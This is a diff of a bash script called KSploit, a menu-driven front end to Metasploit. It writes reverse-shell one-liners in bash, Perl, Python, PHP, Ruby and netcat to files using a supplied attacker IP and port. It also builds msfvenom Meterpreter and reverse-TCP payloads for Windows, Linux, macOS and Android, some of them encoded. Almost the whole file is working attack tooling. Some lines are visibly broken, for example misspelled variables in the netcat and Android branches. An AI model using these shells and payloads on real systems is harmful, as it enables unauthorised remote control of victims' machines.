@@ -1,5 +1,5 @@
 #!/bin/bash
-# Script: kaos v 0.1
+# Script: KSploit v 0.1
 # Author: kaotickj
 # Website: kdgwebsolutions.com
 
@@ -10,25 +10,37 @@
 # -H = $HOST = host
 # -i = $IP = ip
 # -o = $OUTPUT = output file
+switch=$1
+ADDR=$(ip addr | grep tun0|grep inet|awk '{print $2}'|cut -d "/" -f 1)
+EADDR=$(ip addr | grep eth0|grep inet|awk '{print $2}'|cut -d "/" -f 1)
+WADDR=$(ip addr | grep wlan0|grep inet|awk '{print $2}'|cut -d "/" -f 1)
+ME="$(whoami) 👽 $(hostname)"
+ME=$(echo $ME | tr '[:lower:]' '[:upper:]')
+SERVICE=service;
+wdir=$(pwd)
 
 ###########################################
 #---------------  Colors  ----------------#
 ###########################################
 
 C=$(printf '\033')
+FGR="${C}[48;5;196m"
 RED="${C}[1;31m"
 SED_RED="${C}[1;31m&${C}[0m"
 GREEN="${C}[1;32m"
+FGG="${C}[48;5;22m"
 SED_GREEN="${C}[1;32m&${C}[0m"
 YELLOW="${C}[1;33m"
 SED_YELLOW="${C}[1;33m&${C}[0m"
 SED_RED_YELLOW="${C}[1;31;103m&${C}[0m"
 BLUE="${C}[1;34m"
+FGB="${C}[48;5;34m"
 SED_BLUE="${C}[1;34m&${C}[0m"
 ITALIC_BLUE="${C}[1;34m${C}[3m"
 LIGHT_MAGENTA="${C}[1;95m"
 SED_LIGHT_MAGENTA="${C}[1;95m&${C}[0m"
 LIGHT_CYAN="${C}[1;96m"
+FGC="${C}[48;5;237m"
 SED_LIGHT_CYAN="${C}[1;96m&${C}[0m"
 LG="${C}[1;37m" #LightGray
 SED_LG="${C}[1;37m&${C}[0m"
@@ -38,37 +50,28 @@ NC="${C}[0m"
 UNDERLINED="${C}[5m"
 ITALIC="${C}[3m"
 
-################################################################################
-# Help                                                                         #
-################################################################################
-Help()
+###############################################
+locals()
 {
-   # Display Help
-   clear
-   echo
-   echo "    ${RED} _  __${LIGHT_MAGENTA} ____       _       _ _   "
-   echo "    ${RED}| |/ /${LIGHT_MAGENTA}/ ___| ___ | | ___ (_) |_ "
-   echo "    ${RED}| ' /${LIGHT_MAGENTA}\___ \| '_ \| |/ _ \| | __|"
-   echo "    ${RED}| . \\${LIGHT_MAGENTA} ___) | |_) | | (_) | | |_ "
-   echo "    ${RED}|_|\_\\${LIGHT_MAGENTA}____/| .__/|_|\___/|_|\__|"
-   echo "    ${RED}       ${LIGHT_MAGENTA}    |_|                  "
-   echo "       ${GREEN}   🕵🔎 By KaotickJ 👽 " 
-   #	echo "			🖥️ 🐧🍎🤖🐍♻🐚		  "
-   echo 
-   echo " ${BLUE}KSploit is a user friendly control panel in which to drive many metasploit tasks such as generating shells, payloads, and persistence scripts on the fly, starting listeners, and suggesting payloads and exploits."
-   echo
-   echo " ${LIGHT_MAGENTA}Syntax: ksploit.sh [-h|-l|-s|-m|-p|-x]"
-   echo ${GREEN}
-   echo " options:"
-   echo " -------------------------------------------"
-   echo " ${YELLOW}-h ${BLUE}To show this message"
-   echo " ${YELLOW}-l ${BLUE}To load the listeners menu."
-   echo " ${YELLOW}-S ${BLUE}To load the shells menu"
-   echo " ${YELLOW}-m ${BLUE}To start Msfconsole"
-   echo " ${YELLOW}-p ${BLUE}To load the payloads menu."
-   echo " ${YELLOW}-x ${BLUE}To load the persistence menu."
-   echo 
-   echo 
+	echo "               ${FGC}| Your current adapter address(es)  |${NC}${YELLOW}"
+	if [ -z "$EADDR" ]  &&  [ -z "$ADDR" ]  &&  [ -z "$WADDR" ];
+	then
+	   echo "               ${FGR}|       ⚠️   NOT CONNECTED   ⚠️       |${NC}${YELLOW}"
+	fi
+	if [ -n "${EADDR}" ];
+	then
+	  echo "               | ETH0: $EADDR"| sed 's/$/ /g'
+	fi
+	if [ -n "${ADDR}" ]; 
+	then
+	   echo "               | TUN0: $ADDR"| sed 's/$/ /g'
+	fi 
+	if [ -n "${WADDR}" ]; 
+	then
+	   echo "               | WLAN0: $WADDR"| sed 's/$/ /g'
+	fi
+           echo "               -------------------------------------"
+	return 
 }
 
 ################################################################################
@@ -76,8 +79,8 @@ Help()
 ################################################################################
 shells()
 {    
-	clear
-	echo ${YELLOW}"
+clear
+echo ${YELLOW}"
 	 ____  _          _ _     
 	/ ___|| |__   ___| | |___ 
 	\___ \| '_ \ / _ \ | / __|
@@ -85,93 +88,156 @@ shells()
 	|____/|_| |_|\___|_|_|___/
 	 🐚🐚🐚🐚🐚🐚🐚🐚🐚🐚🐚🐚                          
 	"
-        echo "     if you need an advanced php shell, go here:    "
-        echo "https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell"
-        echo "${BLUE}-----------------------------------------------------"
-        echo "${BLUE}          💰       Crafting Shells       💰          "
-        echo "${BLUE}-----------------------------------------------------"
-	echo ${YELLOW}
-	PS3="${YELLOW}Enter your choice (8=QUIT)" 
+   echo "${LIGHT_MAGENTA}  Use the shells menu to quickly and easily craft shell code and scripts.${YELLOW}"
+   echo ${YELLOW}
+   echo "     if you need an advanced php shell, go here:    "
+   echo "     https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell${GREEN}"
+   echo "	   _____________________________________________"
+   echo "	  |${FGG}                    Options:                 ${NC}${YELLOW}|"
+   echo "	  |---------------------------------------------|"
+   echo "	  |    🐚${GREEN} 1 ${BLUE}Bash shell script.                  ${YELLOW}|"
+   echo "	  |---------------------------------------------|"
+   echo "	  |    🦪${GREEN} 2 ${BLUE}PERL shell script.                  ${YELLOW}|"
+   echo "	  |---------------------------------------------|"
+   echo "	  |    🐍${GREEN} 3 ${BLUE}Python shell script.                ${YELLOW}|"
+   echo "	  |---------------------------------------------|"
+   echo "	  |    🐍${GREEN} 4 ${BLUE}Python3 shell script.               ${YELLOW}|"
+   echo "	  |---------------------------------------------|"
+   echo "	  |    📈${GREEN} 5 ${BLUE}PHP shell script.                   ${YELLOW}|"
+   echo "	  |---------------------------------------------|"
+   echo "	  |    🌸${GREEN} 6 ${BLUE}Ruby shell script.                  ${YELLOW}|"
+   echo "	  |---------------------------------------------|"
+   echo "	  |    🐱${GREEN} 7 ${BLUE}Netcat shell script.                ${YELLOW}|"
+   echo "	  |---------------------------------------------|"
+   echo "	  |    🚪${GREEN} q ${BLUE}To quit.                            ${YELLOW}|"
+   echo "	  |_____________________________________________${YELLOW}|"
+   echo
+   if [ ! "${error}" = "" ]
+    then
+     echo "${LG}"
+     echo "            ${FGR}          $error         ${NC}"
+     error="" 
+   fi  
+   echo "${GREEN}"
+   read -n1 -p "     	  What do you want to do? Choose: [1,2,3,4,5,6,7,q]    " opt
+   echo
+   echo
+   locals
+   case "$opt" in
+	1)
+	    touch $wdir/shell.sh
+            echo
+            echo "              ${FGC}   Crafting a Bash Shell script   :   ${NC}${YELLOW}"
+	    read -p '	    Set Attacker IP* ' attackerip
+    	    read -p '	    Set Attacker Port* ' attackerport
+   	    echo "	    🐚🐚🐚 Generating bash shell script ..."	
+	    echo -e "#!/bin/bash" > $wdir/shell.sh
+	    echo -e "bash -i >& /dev/tcp/$attackerip/$attackerport 0>&1" >> $wdir/shell.sh
+	    echo
+	    sleep 1		    
+  	    echo -e "         ${FGG}${YELLOW}   🐚🐚🐚   Bash Shell script saved to $wdir/shell.sh   🐚🐚🐚   ${NC}${YELLOW}"
+	    chmod +x $wdir/shell.sh
+	    echo
+	    echo -e "         or run ${LIGHT_CYAN}bash -i >& /dev/tcp/$attackerip/$attackerport 0>&1${GREEN} on the target machine" &
+  	    sleep 5
+            shells
+	  ;;
+	2)
+	    touch $wdir/shell.pl
+            echo
+            echo "              ${FGC}   Crafting a PERL Shell script   :   ${NC}${YELLOW}"
+	    read -p '	    Set Attacker IP* ' attackerip
+    	    read -p '	    Set Attacker Port* ' attackerport
+   	    echo "	    🦪🦪🦪 Generating perl shell script ..."	
+	    echo -e "perl -e 'use Socket;\$i=\"$attackerip\";\$p=$attackerport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" > $wdir/shell.pl
+	    echo
+	    sleep 1		    
+  	    echo -e "         ${FGG}${YELLOW}   🦪🦪🦪   Perl Shell script saved to $wdir/shell.pl   🦪🦪🦪   ${NC}${YELLOW}"${GREEN}
+	    chmod +x $wdir/shell.pl
+	    echo	
+	    echo -e "         or run ${LIGHT_CYAN}perl -e 'use Socket;\$i=\"$attackerip\";\$p=$attackerport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'${GREEN} on the target machine" &
+  	    sleep 5
+            shells
+	  ;;
+	3)
+	    touch $wdir/shell.py
+		echo
+		echo "              ${FGC}   Crafting a Python Shell script   :   ${NC}${YELLOW}"
+	    read -p '	    Set Attacker IP* ' attackerip
+		read -p '	    Set Attacker Port* ' attackerport
+   	    echo "	    🐍🐍🐍 Generating python shell script ..."	
+	    echo -e "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackerip\",$attackerport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" > $wdir/shell.py
+	    echo
+	    sleep 1		    
+  	    echo -e "         ${FGG}${YELLOW}   🐍🐍🐍   Python Shell script saved to $wdir/shell.py   🐍🐍🐍   ${NC}${YELLOW}"
+	    chmod +x $wdir/shell.py
+	    echo
+	    echo -e "         or run ${LIGHT_CYAN}python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackerip\",$attackerport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'${GREEN} on the target machine" &
+  	    sleep 5
+            shells
+	  ;;
+	 4)
+	    touch $wdir/shell3.py
+		echo
+		echo "              ${FGC}   Crafting a Python3 Shell script   :   ${NC}${YELLOW}"
+	    read -p '	    Set Attacker IP* ' attackerip
+		read -p '	    Set Attacker Port* ' attackerport
+   	    echo "	    🐍🐍🐍 Generating python3 shell script ..."	
+	    echo -e "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackerip\",$attackerport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" > $wdir/shell3.py
+	    echo
+	    sleep 1		    
+  	    echo -e "         ${FGG}${YELLOW}   🐍🐍🐍   Python3 Shell script saved to $wdir/shell3.py   🐍🐍🐍   ${NC}${YELLOW}"
+	    chmod +x $wdir/shell3.py
+	    echo
+	    echo -e "         or run ${LIGHT_CYAN}python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackerip\",$attackerport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'${GREEN} on the target machine" &
+  	    sleep 5
+            shells
+	  ;;
+	5) 
+	    touch shell.php
+	    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
+	    echo -e "php -r '\$sock=fsockopen(\"$attackerip\",$attackerport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" > shell.php
+	    echo -e "${DG} - - - -> PHP Shell script saved to $wdir/shell.php"${GREEN}
+	    echo -e "or run ${LIGHT_CYAN}php -r '\$sock=fsockopen(\"$attackerip\",$attackerport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'${GREEN} on the target machine"
+	    echo "${LIGHT_MAGENTA}     if you need an advanced php shell, go here:    "
+	    echo "https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell${GREEN}" &
+  	    sleep 5
+            shells
+	  ;; 
+	6)
+	    touch shell.rb
+	    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
+	    echo -e "ruby -rsocket -e'f=TCPSocket.open(\"$attackerip\",$attackerport).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" > shell.rb
+	    echo -e "${DG} - - - -> Ruby Shell script saved to $wdir/shell.rb"${GREEN}
+	    echo -e "or run ${LIGHT_CYAN}ruby -rsocket -e'f=TCPSocket.open(\"$attackerip\",$attackerport).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'${GREEN} on the target machine" &
+  	    sleep 5
+            shells
+	 ;;					    
+	 7) 
+	    touch netcat.sh
+	    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
+	    echo -e "nc -e /bin/sh $attackeip $attackeport" > netcat.sh
+	    echo -e "${DG} - - - -> Bash Shell script saved to $wdir/netcat.sh ((RUN WITH ./netcat.sh on the target))"${GREEN}
+	    echo -e "or run ${LIGHT_CYAN}nc -e /bin/sh $attackeip $attackeport ${GREEN}on the target machine" &
+  	    sleep 5
+            shells
+	  ;;
+         q)
+	    clear
+	    goto $start
+         ;;
+ 	 *)
+	    clear 
+	    error="$opt is not a valid option!"      	
+	    shells
+	 ;;
+    esac
 
-	options=("Bash" "Perl" "Python" "Python_3" "PHP" "Ruby" "Netcat" "Quit")
-	select opt in "${options[@]}"
-	do
-	    case $opt in
-		"Bash")
-    		    touch shell.sh
-		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
-		    echo -e "#!/bin/bash" > shell.sh
-		    echo -e "bash -i >& /dev/tcp/$attackerip/$attackerport 0>&1" >> shell.sh		    
-		    echo -e "${DG} - - - -> Bash Shell script saved to $wdir/shell.sh"${GREEN}
-		    echo -e "or run ${LIGHT_CYAN}bash -i >& /dev/tcp/$attackerip/$attackerport 0>&1${GREEN} on the target machine"
-		    ;;
-		"Perl")
-    		    touch shell.pl
-		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
-		    echo -e "perl -e 'use Socket;\$i=\"$attackerip\";\$p=$attackerport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" > shell.pl
-		    echo -e "${DG} - - - -> Perl Shell script saved to $wdir/shell.pl"${GREEN}
-		    echo -e "or run ${LIGHT_CYAN}perl -e 'use Socket;\$i=\"$attackerip\";\$p=$attackerport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'${GREEN} on the target machine"
-		    ;;
-		"Python")
-    		    touch shell.py
-		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
-		    echo -e "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackerip\",$attackerport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" > shell.py
-		    echo -e "${DG} - - - -> Python Shell script saved to $wdir/shell.py"${GREEN}
-		    echo -e "or run ${LIGHT_CYAN}python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackerip\",$attackerport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'${GREEN} on the target machine"
-		    ;;
-		"Python_3")
-    		    touch shell3.py
-		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
-		    echo -e "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackerip\",$attackerport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" > shell3.py
-		    echo -e "${DG} - - - -> Python3 Shell script saved to $wdir/shell3.py"${GREEN}
-		    echo -e "or run ${LIGHT_CYAN}python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackerip\",$attackerport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'${GREEN} on the target machine"
-		    ;;
-		"PHP") 
-    		    touch shell.php
-		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
-		    echo -e "php -r '\$sock=fsockopen(\"$attackerip\",$attackerport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" > shell.php
-		    echo -e "${DG} - - - -> PHP Shell script saved to $wdir/shell.php"${GREEN}
-		    echo -e "or run ${LIGHT_CYAN}php -r '\$sock=fsockopen(\"$attackerip\",$attackerport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'${GREEN} on the target machine"
-		    echo "${LIGHT_MAGENTA}     if you need an advanced php shell, go here:    "
-		    echo "https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell${GREEN}"
-		    ;; 
-	        "Ruby")
-	            touch shell.rb
-       		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
-		    echo -e "ruby -rsocket -e'f=TCPSocket.open(\"$attackerip\",$attackerport).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" > shell.rb
-		    echo -e "${DG} - - - -> Ruby Shell script saved to $wdir/shell.rb"${GREEN}
-		    echo -e "or run ${LIGHT_CYAN}ruby -rsocket -e'f=TCPSocket.open(\"$attackerip\",$attackerport).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'${GREEN} on the target machine"
-	            ;;					    
-		 "Netcat") 
-		    touch netcat.sh
-       		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
-		    echo -e "nc -e /bin/sh $attackeip $attackeport" > netcat.sh
-		    echo -e "${DG} - - - -> Bash Shell script saved to $wdir/netcat.sh ((RUN WITH ./netcat.sh on the target))"${GREEN}
-		    echo -e "or run ${LIGHT_CYAN}nc -e /bin/sh $attackeip $attackeport ${GREEN}on the target machine"
-		    ;;
-		 #JAVA) r = Runtime.getRuntime()
-#			p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])
-#			p.waitFor()
-		"Quit")
-	 	    clear		
-		    echo "Good Bye" && break
-		    ;;
-		*) echo 💀 invalid option 💀;;
-	    esac
-	done
 }
 
-#	echo -e "   1.)  💰 Craft a payload"
-#	echo -e "   2.)  👂 Craft a listener"
-#	echo -e "   4.)  ⌚ Craft persistence script"
-#	echo -e "   5.)  🚪 Quit"
-
-#	read options
-
-#	case "$options" in
-
-#	  "1" | "1" )
-
+################################################################################
+# Payloads Menu
+################################################################################
 payloads()
 {
 	clear
@@ -183,231 +249,584 @@ payloads()
 	|_|   \__,_|\__, |_|\___/ \__,_|\__,_|___/
 		    |___/                         
 	 💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰	    
-		    
  '
-        echo "${BLUE}-----------------------------------------------------"
-        echo "${BLUE}          💰      Crafting Payloads      💰          "
-        echo "${BLUE}-----------------------------------------------------"
-        echo ${LIGHT_MAGENTA}
-	PS3="${YELLOW}Enter your choice (9=QUIT)" 
-
-	options=("Windows_x86" "Windows_x64" "Linux" "Mac" "Android" "Python" "Meterpreter_x86" "Meterpreter_x64" "Quit")
-	select opt in "${options[@]}"
-	do
-	    case $opt in
-		"Windows_x86")
-		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport; read -p 'Set exe filename (omitting the .exe)* ' exename
-		    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport -e x86/shikata_ga_nai -i 10 -f exe > $exename.exe
-		    echo "Generating payload ....."	
-		    echo -e "${DG} - - - -> exename.exe saved ${GREEN}"
-		    ;;
-		"Windows_x64")
-		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport; read -p 'Set exe filename (omitting the .exe)* ' exename
-		    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport -e x64/xor -i 10 -f exe > $exename.exe
-		    echo "Generating payload ....."	
-		    echo -e "${DG} - - - -> $exename.exe saved ${GREEN}"
-		    ;;
-		"Linux")
-		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport; read -p 'Set elf filename (omitting the .elf)* ' elfname
-		    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport -f elf > $elfname.elf
-		    echo -e "${DG} - - - -> $elfname.elf saved ${GREEN}"
-		    ;;
-		"Mac")
-		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport; read -p 'Set .macho filename (omitting the .macho)* ' machoname
-		    msfvenom -p osx/x86/shell_reverse_tcp LHOST=$attackerip LPORT=$attackerport -f macho > $machoname.macho
-		    echo "Generating payload ....."	
-		    echo -e "${DG} - - - -> $machoname.macho saved ${GREEN}"
-		    ;;
-		"Android")
-		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport; read -p 'Set apk filename (omitting the .elf)* ' apkname
-		    msfvenom -p android/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport -f raw > $apkname.apk
-		    echo "Generating payload ....."	
-		    echo -e "${DG} - - - -> $apkname.apk saved ${GREEN}"
-		    ;;  
-		"Python")
-		    echo
-		    echo "${DG} - - - -> set payload cmd/unix/reverse_python"
-		    echo ${GREEN}
-		    read -p 'Enter Attack box IP* ' attackerip
-		    echo "${DG} - - - -> set LHOST="$attackerip
-		    echo ${GREEN}
-		    read -p 'Enter Attack box Port* ' attackerport
-		    echo "${DG} - - - -> set LPORT="$attackerport
-		    echo ${GREEN}
-		    echo "Generating payload ....."	
-		    msfvenom -p cmd/unix/reverse_python LHOST=$attackerip LPORT=$attackerport -f raw > shell.py
-		    echo -e "${DG} - - - -> shell.py saved ${GREEN}"
-		    ;;
-		"Meterpreter_x86")
-		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
-		    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport -f elf > shellx86.elf
-		    echo -e "${DG} - - - -> shell.elf saved ${GREEN}"
-		    ;;
-		"Meterpreter_x64")
-		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
-		    msfvenom -p linux/x64/shell_reverse_tcp LHOST=$attackerip LPORT=$attackerport -f elf > shellx64.elf
-		    echo "Generating payload ....."	
-		    echo -e "${DG} - - - -> shell.elf saved ${GREEN}"
-		    ;;
-		"Quit")
-	 	    clear		
-		    echo "Good Bye" && break
-		    ;;
-		*) echo 💀 invalid option 💀;;
-	    esac
-	done
+   echo "${LIGHT_MAGENTA}  Use the payloads menu to quickly and easily craft metasploit payloads."
+   echo ${YELLOW}
+   echo "	   _____________________________________________"
+   echo "	  |${FGG}                    Options:                 ${NC}${YELLOW}|"
+   echo "	  |---------------------------------------------|"
+   echo "	  |    🖥️ ${GREEN} 1 ${BLUE}Windows Payloads.                   ${YELLOW}|"
+   echo "	  |---------------------------------------------|"
+   echo "	  |    🐧${GREEN} 2 ${BLUE}Linux Payloads.                     ${YELLOW}|"
+   echo "	  |---------------------------------------------|"
+   echo "	  |    🍎${GREEN} 3 ${BLUE}Mac OSX Reverse TCP.                ${YELLOW}|"
+   echo "	  |---------------------------------------------|"
+   echo "	  |    🤖${GREEN} 4 ${BLUE}Android Meterpreter Reverse TCP.    ${YELLOW}|"
+   echo "	  |---------------------------------------------|"
+   echo "	  |    🐍${GREEN} 5 ${BLUE}Unix Reverse Python.                ${YELLOW}|"
+   echo "	  |---------------------------------------------|"
+   echo "	  |    🚪${GREEN} q ${BLUE}Quit to main menu.                  ${YELLOW}|"
+   echo "	  |_____________________________________________${YELLOW}|${GREEN}"
+   echo	
+   if [ ! "${error}" = "" ]
+    then
+     echo "${LG}"
+     echo "            ${FGR}          $error         ${NC}"
+     error="" 
+   fi  
+   echo "${GREEN}"
+   read -n1 -p "     	  What do you want to do? Choose: [1,2,3,4,5,q]    " opt
+   echo
+   echo
+   locals
+   case "$opt" in
+        1)
+          winpayloads
+        ;;  
+	2)
+	  linpayloads
+	;;	
+	3)
+          echo
+          echo "          ${FGC}   Crafting a Mac OSX Reverse TCP Payload :   ${NC}${YELLOW}"
+	  read -p '	    Set Attacker IP* ' attackerip
+    	  read -p '	    Set Attacker Port* ' attackerport
+	  echo "	    💰💰💰 Generating mac osx payload ..."	
+	  msfvenom -p osx/x86/shell_reverse_tcp LHOST=$attackerip LPORT=$attackerport -f macho > $wdir/shell.macho
+	  echo -e "         ${FGG}${YELLOW}   💰💰💰   $wdir/shell.macho saved   💰💰💰   ${NC}${GREEN}" &
+	  sleep 2
+          payloads
+	;;
+	4)
+          echo
+          echo "          ${FGC}  Crafting an Android Meterpreter Payload :   ${NC}${YELLOW}"
+	  read -p '	    Set Attacker IP* ' attackerip
+    	  read -p '	    Set Attacker Port* ' attackerport
+	  echo "	    💰💰💰 Generating android meterpreter payload ..."	
+	  msfvenom -p android/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport R > $wdr/shell.apk
+	  echo -e "         ${FGG}${YELLOW}   💰💰💰   $wdir/shell.apk saved   💰💰💰   ${NC}${GREEN}" &
+	  sleep 2
+          payloads
+	;;  
+	5)
+	  echo
+          echo "         ${FGC}    Crafting a Reverse Python Payload  :   ${NC}${YELLOW}"
+	  read -p '	    Set Attacker IP* ' attackerip
+    	  read -p '	    Set Attacker Port* ' attackerport
+	  echo "	    💰💰💰 Generating reverse python payload ..."	
+	  msfvenom -p cmd/unix/reverse_python LHOST=$attackerip LPORT=$attackerport -f raw > $wdir/shell.py
+	  echo -e "         ${FGG}${YELLOW}   💰💰💰   $wdir/shell.py saved   💰💰💰   ${NC}${GREEN}" &
+	  sleep 2
+          payloads
+	;;
+        q)
+          clear
+          goto $start
+        ;;
+        *)
+          clear 
+          error="$opt is not a valid option!"      	
+          payloads
+        ;;
+   esac    
 }
 
+################################################################################
+# Linux Payloads Menu
+################################################################################
+linpayloads()
+{
+	clear
+	echo ${LIGHT_CYAN}'
+	 ____             _                 _        
+	|  _ \ __ _ _   _| | ___   __ _  __| |___ 
+	| |_) / _` | | | | |/ _ \ / _` |/ _` / __|
+	|  __/ (_| | |_| | | (_) | (_| | (_| \__ \
+	|_|   \__,_|\__, |_|\___/ \__,_|\__,_|___/
+		    |___/                         
+	 💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰	    
+'
+   echo "${LIGHT_MAGENTA}  Use the payloadss menu to quickly and easily craft metasploit payloads."
+   echo ${YELLOW}
+   echo "	   _____________________________________________"
+   echo "	  |${FGG}                    Options:                 ${NC}${YELLOW}|"
+   echo "	  |---------------------------------------------|"
+   echo "	  |    🐧${GREEN} 1 ${BLUE}Linux x86 Meterpreter Reverse TCP.  ${YELLOW}|"
+   echo "	  |---------------------------------------------|"
+   echo "	  |    🐧${GREEN} 2 ${BLUE}Linux x64 Meterpreter Reverse TCP.  ${YELLOW}|"
+   echo "	  |---------------------------------------------|"
+   echo "	  |    🚪${GREEN} q ${BLUE}Quit to payloads menu.              ${YELLOW}|"
+   echo "	  |_____________________________________________${YELLOW}|${GREEN}"
+   echo	
+   if [ ! "${error}" = "" ]
+    then
+     echo "${LG}"
+     echo "            ${FGR}          $error         ${NC}"
+     error="" 
+   fi  
+   echo "${GREEN}"
+   read -n1 -p "     	  What do you want to do? Choose: [1,2,q]    " opt
+   echo
+   echo
+   locals
+   case "$opt" in
+	1)
+	  echo 
+          echo "  ${FGC}    Crafting a Linux x86 Meterpreter Reverse TCP Payload :   ${NC}${YELLOW}"
+	  read -p '	    Set Attacker IP* ' attackerip
+    	  read -p '	    Set Attacker Port* ' attackerport
+	  echo "	    💰💰💰 Generating linux x86 meterpreter payload ..."	
+	  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport -f elf > $wdir/shell.elf
+	  echo -e "         ${FGG}${YELLOW}   💰💰💰   $wdir/shell.elf saved   💰💰💰   ${NC}${GREEN}" &
+	  sleep 2
+	  payloads
+	;;
+	2)
+	  echo 
+          echo "  ${FGC}    Crafting a Linux x64 Meterpreter Reverse TCP Payload :   ${NC}${YELLOW}"
+	  read -p '	    Set Attacker IP* ' attackerip
+    	  read -p '	    Set Attacker Port* ' attackerport
+	  echo "	    💰💰💰 Generating linux x64 meterpreter payload ..."	
+	  msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport -f elf > $wdir/shell64.elf
+	  echo -e "         ${FGG}${YELLOW}   💰💰💰   $wdir/shell64.elf saved   💰💰💰   ${NC}${GREEN}" &
+	  sleep 2
+	  payloads
+	;;
+	q)
+	  clear
+	  payloads
+	;;
+	*)
+          clear 
+          error="$opt is not a valid option!"      	
+          linpayloads
+	;;
+   esac
+}
+
